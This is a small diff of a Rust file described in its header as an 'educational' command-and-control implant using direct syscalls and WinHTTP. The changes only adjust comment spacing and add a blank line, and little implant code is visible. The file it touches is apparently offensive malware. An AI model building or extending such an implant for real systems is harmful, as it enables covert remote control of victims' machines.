@@ -1,8 +1,8 @@
 // AETHER IMPLANT - EDUCATIONAL RELEASE
-// Author: Andrei Costin
+// Author:Andrei Costin
 // License: MIT (See Repository)
-// Description: Advanced C2 Implant written in Rust using direct Syscalls and WinHTTP.
-// DISCLAIMER: This code is for educational purposes only.
+// Description:Advanced C2 Implant written in Rust using direct Syscalls and WinHTTP.
+// DISCLAIMER:This code is for educational purposes only.
 
 use std::ffi::c_void;
 use std::ptr::{null_mut};
@@ -325,4 +325,5 @@ fn main() {
             Err(_) => { smart_sleep(); },
         }
     }
+
 }
